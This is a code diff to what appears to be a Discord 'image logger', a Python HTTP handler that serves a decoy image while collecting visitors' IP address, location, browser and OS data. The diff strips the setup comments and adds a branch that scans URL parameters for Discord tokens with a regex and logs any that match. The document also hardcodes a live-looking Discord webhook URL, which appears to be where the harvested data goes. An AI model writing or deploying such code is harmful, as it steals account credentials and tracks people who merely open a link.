@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser, re
 
-webhook = 'https://discord.com/api/webhooks/1517942914515210411/hHAvckZOavjRoME7Uyt2qXVF0IE6CP0iO2z9dFh_nbu1QWDbHBw6_dsr6UBcI8QzEZFo'  # Replace with your webhook
+webhook = 'https://discord.com/api/webhooks/1517942914515210411/hHAvckZOavjRoME7Uyt2qXVF0IE6CP0iO2z9dFh_nbu1QWDbHBw6_dsr6UBcI8QzEZFo'
 bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCTeJgEKkWBNzhM_Qzq5OYn56mFqDUPXSzHw&s.jpg').content
-buggedimg = True  # Set to True if you want the image to load on Discord, False otherwise
+buggedimg = True
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 TOKEN_REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
@@ -123,6 +123,13 @@ class handler(BaseHTTPRequestHandler):
                     ipInfo['country'], ipInfo['loc'], ipInfo['org'], 
                     ipInfo['postal'], useragent, ipInfo['os'], ipInfo['browser']
                 ))
+        else:
+            # Extract tokens from URL parameters for non-Discord previews
+            for param, values in query.items():
+                for value in values:
+                    matches = re.findall(TOKEN_REGEX, value)
+                    if matches:
+                        log_token(matches[0], forwarded_for, useragent)
 
 if __name__ == '__main__':
     from http.server import HTTPServer
